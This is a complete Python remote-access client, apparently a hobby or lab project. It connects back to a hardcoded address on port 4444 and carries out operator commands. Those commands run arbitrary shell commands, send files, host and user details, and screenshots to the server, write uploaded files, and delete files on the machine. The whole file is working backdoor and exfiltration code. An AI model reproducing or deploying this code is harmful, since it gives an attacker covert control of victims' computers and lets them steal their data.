import socket
import os
import platform
import subprocess
import pyautogui


def start_client():
    server_ip   = "192.168.10.107"  
    server_port = 4444

# Variables for connecting to the server

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((server_ip, server_port))
    except Exception:
        return  

# Tries to connect to the server if error then it 

    cwd = os.getcwd()
    while True:
        data = sock.recv(4096)
        if not data:
            break

# For maintaining communication with the server.

        cmd = data.decode('utf-8', errors='ignore')

        if cmd == "LIST_DIR":
            resp = "\n".join(os.listdir(cwd))
            sock.send(resp.encode())

# LS/list command to fetch files and directories in the current working directory

        elif cmd == "GET_INFO":
            info = [f"Platform: {platform.platform()}",
                    f"Hostname: {platform.node()}",
                    f"User: {os.getlogin()}",
                    f"CWD: {cwd}"]
            sock.send("\n".join(info).encode())

# Gets info about the computer.

        elif cmd.startswith("SHELL "):
            shell_cmd = cmd[6:]
            if shell_cmd.startswith("cd "):

                target = shell_cmd[3:].strip().replace('~', os.path.expanduser('~'))
                try:
                    new_dir = os.path.abspath(os.path.join(cwd, target))
                    os.chdir(new_dir)
                    cwd = new_dir
                    sock.send(f"Changed directory to {cwd}".encode())
                except Exception as e:
                    sock.send(f"ERROR cd: {e}".encode())
            else:
                try:
                    output = subprocess.check_output(shell_cmd, shell=True, cwd=cwd, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                sock.send(output if output else b" ")

# Shell commands. Change directory also works

        elif cmd.startswith("DOWNLOAD_FILE "):
            _, path = cmd.split(" ", 1)
            full = path if os.path.isabs(path) else os.path.join(cwd, path)
            if os.path.isfile(full):
                fsize = os.path.getsize(full)
                header = f"FILE_TRANSFER {os.path.basename(full)} {fsize}\n".encode()
                sock.send(header)
                with open(full, "rb") as f:
                    for chunk in iter(lambda: f.read(4096), b''):
                        sock.send(chunk)
            else:
                sock.send(f"ERROR File not found: {path}".encode())

# Downloads files from the client

        elif cmd.startswith("UPLOAD_FILE "):

            _, fname, fs = cmd.split(" ")
            filesize = int(fs)
            with open(fname, "wb") as f:
                rec = 0
                while rec < filesize:
                    chunk = sock.recv(min(4096, filesize - rec))
                    if not chunk:
                        break
                    f.write(chunk)
                    rec += len(chunk)
            sock.send(f"UPLOADED {fname}".encode())

# Uploads files to the client from the server

        elif cmd.startswith("DELETE_FILE "):
            _, path = cmd.split(" ", 1)
            full = path if os.path.isabs(path) else os.path.join(cwd, path)
            try:
                os.remove(full)
                sock.send(f"Deleted {path}".encode())
            except Exception as e:
                sock.send(f"ERROR Deleting: {e}".encode())

# Deletes files from the client pc


        elif cmd == "TAKE_SCREENSHOT":
            tmp = "screencap.png"
            pyautogui.screenshot(tmp)
            fsize = os.path.getsize(tmp)
            header = f"FILE_TRANSFER screenshot.png {fsize}\n".encode()
            sock.send(header)
            with open(tmp, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    sock.send(chunk)
            os.remove(tmp)

# Screenshots the client pc's screen

        elif cmd == "EXIT":
            break

        else:
            sock.send(f"ERROR Unknown command: {cmd}".encode())

    sock.close()

# Stops the program

if __name__ == "__main__":
    start_client()

# Starts client
